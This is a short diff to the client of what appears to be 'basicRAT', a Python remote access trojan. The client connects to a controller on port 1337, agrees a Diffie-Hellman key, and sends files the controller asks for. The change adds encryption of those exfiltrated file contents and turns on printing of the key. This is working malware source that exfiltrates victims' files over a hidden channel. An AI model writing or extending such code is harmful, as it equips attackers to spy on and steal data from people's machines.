@@ -3,6 +3,7 @@
 
 from basicRAT import *
 import struct
+import binascii
 HOST = 'localhost'
 PORT = 1337
 FALLBACK_KEY  = '82e672ae054aa4de6f042c888111686a'
@@ -13,7 +14,7 @@ def main():
     s = socket.socket()
     s.connect((HOST, PORT))
     DHKEY = diffiehellman(s)
-    #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
+    print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
     
     while True:
         data = s.recv(1024)
@@ -41,8 +42,9 @@ def main():
                 with open(fname, 'rb') as f:
                     res = f.read(4096)
                     while len(res):
-                        s.send(struct.pack("!I", len(res)))
-                        x = s.send(res)
+                        enc_res = encrypt(res, DHKEY)
+                        s.send(struct.pack("!I", len(enc_res)))
+                        s.send(enc_res)
                         res = f.read(4096)
                     s.send('\x00\x00\x00\x00'); # EOF
             
